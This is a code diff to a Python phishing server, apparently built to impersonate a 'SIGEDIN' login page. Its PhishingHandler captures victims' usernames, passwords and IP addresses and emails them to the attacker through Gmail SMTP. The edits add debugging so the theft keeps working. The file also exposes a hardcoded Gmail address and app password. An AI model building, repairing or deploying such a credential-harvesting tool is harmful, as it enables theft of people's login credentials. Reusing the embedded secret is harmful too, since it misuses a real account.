@@ -12,6 +12,7 @@ CORREO_NOTIFICACION = "marlonmoncayo7474@gmail.com"
 PASSWORD_NOTIFICACION = "jpwy hpdh lnuy tpaw"  # Tu contraseña de aplicación de Gmail
 
 def enviar_alerta_correo(usuario, clave, ip, fecha):
+    print(f"[DEBUG] Intentando enviar correo para el usuario: {usuario}")
     try:
         msg = MIMEMultipart("alternative")
         msg['Subject'] = "🚨 ¡Nuevas credenciales capturadas en SIGEDIN!"
@@ -35,13 +36,14 @@ def enviar_alerta_correo(usuario, clave, ip, fecha):
         msg.attach(MIMEText(cuerpo, 'html', 'utf-8'))
 
         server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.set_debuglevel(1)  # Activa logs detallados de SMTP en la consola de Render
         server.starttls()
         server.login(CORREO_NOTIFICACION, PASSWORD_NOTIFICACION)
         server.sendmail(CORREO_NOTIFICACION, CORREO_NOTIFICACION, msg.as_string())
         server.quit()
         print("[+] Alerta de credenciales enviada por correo exitosamente.")
     except Exception as e:
-        print(f"[-] Error al enviar la alerta por correo: {e}")
+        print(f"[-] ERROR CRITICO al enviar la alerta por correo: {e}")
 
 class PhishingHandler(http.server.SimpleHTTPRequestHandler):
     def end_headers(self):
@@ -60,7 +62,7 @@ class PhishingHandler(http.server.SimpleHTTPRequestHandler):
         
         print(f"\n[¡ALERTA! CREDENCIALES CAPTURADAS] Usuario: {usuario} | Clave: {clave} | IP: {ip}")
         
-        # Enviar el correo en segundo plano para no congelar la página
+        # Enviar el correo en segundo plano
         hilo_correo = threading.Thread(target=enviar_alerta_correo, args=(usuario, clave, ip, fecha))
         hilo_correo.start()
         
